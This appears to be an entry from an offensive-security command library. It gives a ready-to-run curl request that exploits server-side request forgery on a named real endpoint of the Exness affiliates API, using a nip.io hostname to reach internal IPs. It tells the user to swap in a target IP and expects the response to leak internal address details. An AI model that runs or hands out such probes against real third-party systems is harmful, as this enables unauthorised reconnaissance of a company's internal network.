---
id: cmd-exness-get-nip-http
data: >-
  curl -X GET
  "https://my.exnessaffiliates.com/api/partner_integrations/template/check/?url=http://10.0.0.1.nip.io"
tags:
  - ssrf
  - dns-rebinding
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:14.625Z'
verified: false
validated: true
submitted: true
---
# get-check-nip-io-http

## Command

```bash
curl -X GET "https://my.exnessaffiliates.com/api/partner_integrations/template/check/?url=http://10.0.0.1.nip.io"
```

## Description

HTTP DNS rebinding for IP enumeration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `url` | nip.io subdomain with IP | Yes |

## Examples

### Basic Usage

Replace 10.0.0.1 with target IP.

## Expected Output

Error with internal IP details.

## Related

- [[commands/get-check-nip-io-https]]
- [[procedures/Enumerate-Internal-IPs-with-DNS-Rebinding]]
